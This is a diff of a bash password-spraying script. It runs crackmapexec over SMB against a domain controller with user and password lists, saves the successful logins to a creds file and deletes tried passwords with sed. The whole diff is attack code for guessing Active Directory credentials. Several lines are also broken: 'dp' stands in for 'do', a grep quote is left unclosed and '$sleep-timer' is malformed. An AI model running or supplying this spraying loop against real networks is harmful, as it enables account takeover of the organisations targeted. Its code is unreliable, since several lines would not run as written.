@@ -7,7 +7,7 @@
 # $1 - dc-ip
 # $2 - user list
 # $3 - password list
-# $4 - outlog file
+# $4 - outlog file (not yet)
 # $5 - sleep timer
 
 newest=6
@@ -55,13 +55,27 @@ sleep 10
 
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-for pass in $(cat $3)
-  do crackmapexec smb $1 -u $2 -p $pass --log ~/Documents/sprays/spraygun.txt
-  echo "found creds: "
-  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+] | tee -a ~/Documents/sprays/creds.txt
-  $sleep-timer
+for pass in $(cat $3); dp
+	  crackmapexec smb $1 -u $2 -p $pass --log ~/Documents/sprays/spraygun.txt
+	  echo $pass > ~/Documents/sprays/used-passwords.txt
+	  echo "found creds: "
+	  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+] | tee -a ~/Documents/sprays/creds.txt
+	  sed -i "/$pass/d" $3
+	  $sleep-timer
 done
 
+
+### trying to figure out sed with spaces
+for pass in $(cat $1); do
+	  echo "$pass" >> used.txt
+	  echo "found creds: "
+	  
+	  sed -i "/'$pass\s'/d" $1
+	  sed -i "/$pass/d" $1
+	  
+	  echo "removed " $pass
+	  sleep 2s
+done
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
